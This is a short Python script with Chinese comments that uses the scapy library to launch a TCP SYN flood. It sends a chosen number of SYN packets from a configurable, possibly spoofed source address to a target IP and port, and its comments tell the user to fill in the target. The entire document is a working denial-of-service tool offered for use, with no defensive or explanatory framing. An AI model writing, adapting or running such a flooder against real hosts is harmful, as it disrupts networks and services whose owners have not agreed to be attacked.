from scapy.all import IP, TCP, send

def syn_flood_attack(target_ip, target_port, num_packets):
    src_ip = "192.168.1.100"  # 替换成你希望使用的源IP地址
    src_port = 1234  # 使用一个随机的源端口号
    for _ in range(num_packets):
        # 创建一个SYN数据包
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags='S')
        send(packet, verbose=False)

if __name__ == "__main__":
    target_ip = "192.168.1.1"  # 更换为目标IP地址
    target_port = 80  # 更换为目标端口号
    num_packets = 1000  # 指定要发送的数据包数量
    syn_flood_attack(target_ip, target_port, num_packets)
